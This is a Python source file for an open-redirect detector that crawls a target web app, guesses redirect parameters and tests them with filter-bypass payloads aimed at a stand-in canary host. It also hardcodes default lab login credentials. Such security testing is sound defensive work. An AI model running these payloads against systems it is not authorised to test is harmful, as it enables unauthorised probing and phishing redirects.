#!/usr/bin/env python3
r"""openredirect_harness.py - open-redirect detector (black-box, anonymous).

Pre-auth class: no login needed, which is the real enterprise threat model. Discovers
redirect-ish params (next / redirect / url / return / dest / ...) from the crawl, the
param wordlist, and NABLUS_SEEDS, then sets each to an external CANARY host and checks
whether the app tries to send the browser off-domain.

Confirm oracle (two independent proofs, both high-confidence, low-FP):
  * server-side: a 3xx whose Location host == CANARY (or //CANARY, /\CANARY bypasses).
  * client-side: a 200 whose body puts CANARY inside a real redirect sink
    (meta refresh url=, location=, location.href/replace/assign).
A param that merely REFLECTS the canary into a link/text is NOT confirmed - only an
actual redirect-to-attacker is a finding. Read-only (GET), does not follow redirects.
"""
from __future__ import annotations  # noqa
import os, re, json, time, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from html.parser import HTMLParser

BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
OUT = r"C:\Users\Laith\nabulus-agent\openredirect_findings.json"
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
PACE = 0.02

CANARY = "or-canary.nablus.example"       # reserved-ish host; we never visit it, only detect intent
REDIRECT_PARAMS = ["next", "redirect", "redirect_uri", "redirect_url", "redirecturl", "url",
                   "return", "returnurl", "return_to", "returnto", "dest", "destination",
                   "continue", "to", "r", "u", "goto", "out", "link", "target", "forward",
                   "callback", "checkout_url", "image_url", "page", "path"]
# filter-bypass payload shapes; each should still resolve to CANARY as the host
PAYLOADS = [f"https://{CANARY}/p", f"//{CANARY}/p", f"https:/{CANARY}/p", f"/\\{CANARY}/p",
            f"https://{CANARY}%2f@trusted/p"]
_META = re.compile(r'http-equiv=["\']?refresh["\']?[^>]*url=([^"\'>\s]+)', re.I)
_JS = re.compile(r'(?:location\.(?:href|replace|assign)\s*=\s*|window\.location\s*=\s*|location\s*=\s*)'
                 r'["\']([^"\']+)["\']', re.I)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None                              # never follow; we want to SEE the Location


def login_cookie():
    # best-effort range-style login; harmless/failed elsewhere -> stays anonymous
    cj = http.cookiejar.CookieJar()
    try:
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        op.open(BASE + "/login", data=urlencode(
            {"username": os.environ.get("NABLUS_USER", "alice"),
             "password": os.environ.get("NABLUS_PASS", "Sunflower#A1pha")}).encode(), timeout=8)
    except Exception:
        pass
    return "; ".join(f"{c.name}={c.value}" for c in cj)


def fetch(url, cookie, follow=False):
    if PACE:
        time.sleep(PACE)
    handlers = [urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())]
    if not follow:
        handlers.append(_NoRedirect())
    op = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, headers={"Cookie": cookie} if cookie else {})
    try:
        r = op.open(req, timeout=10)
        return r.status, dict(r.headers), r.read(120000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read(120000).decode("utf-8", "replace") if e.fp else "")
    except Exception:
        return 0, {}, ""


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if a.get("href"):
            self.hrefs.append(a["href"])


def candidates(cookie):
    seen, frontier, cands, stems = set(), [BASE + "/"], set(), set()
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen or len(seen) >= 15:
                continue
            seen.add(u)
            st, _h, body = fetch(u, cookie, follow=True)
            if st not in (200, 301, 302, 303, 307, 308):
                continue
            pr = urlparse(u)
            stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
            for k, _v in parse_qsl(pr.query):
                cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
            p = _Links()
            try:
                p.feed(body)
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen and "logout" not in link.lower():
                    nxt.append(link)
        frontier = nxt
    for s in SEEDS:
        pr = urlparse(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s)
        stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
        for k, _v in parse_qsl(pr.query):
            cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
    for stem in stems | {BASE + "/", BASE + "/login", BASE + "/login/"}:
        for pn in REDIRECT_PARAMS:
            cands.add((stem, pn))
    return sorted(cands)


def _host(u):
    try:
        return urlparse(u if "//" in u else "//" + u.lstrip("/\\")).netloc.split("@")[-1].lower()
    except Exception:
        return ""


def confirm(base, param, cookie):
    for pl in PAYLOADS:
        u = f"{base}?{urlencode({param: pl})}"
        st, hdrs, body = fetch(u, cookie, follow=False)
        loc = hdrs.get("Location") or hdrs.get("location") or ""
        if st in (301, 302, 303, 307, 308) and loc and _host(loc) == CANARY:
            return {"kind": "server-side 3xx", "payload": pl, "location": loc[:120], "status": st}
        if st == 200 and body:
            for m in list(_META.findall(body)) + list(_JS.findall(body)):
                if _host(m) == CANARY:
                    return {"kind": "client-side redirect sink", "payload": pl, "location": m[:120], "status": st}
    return None


def main():
    cookie = login_cookie()
    cands = candidates(cookie)
    findings, tested = [], set()
    print(f"target: {BASE} | candidates: {len(cands)}")
    for base, param in cands:
        key = base + "|" + param
        if key in tested:
            continue
        tested.add(key)
        proof = confirm(base, param, cookie)
        if proof:
            findings.append({"class": "open-redirect", "severity": "medium", "endpoint": base,
                             "param": param, "proof": proof,
                             "proof_request": f"GET {base}?{param}={proof['payload']}",
                             "validated_by": f"app redirected to attacker host via {proof['kind']}",
                             "confirmed": True})
            print(f"[openredir] CONFIRMED: {urlparse(base).path}?{param}=  [{proof['kind']}] -> {proof['location']}")
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[openredir] confirmed open-redirect findings: {len(findings)} -> {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
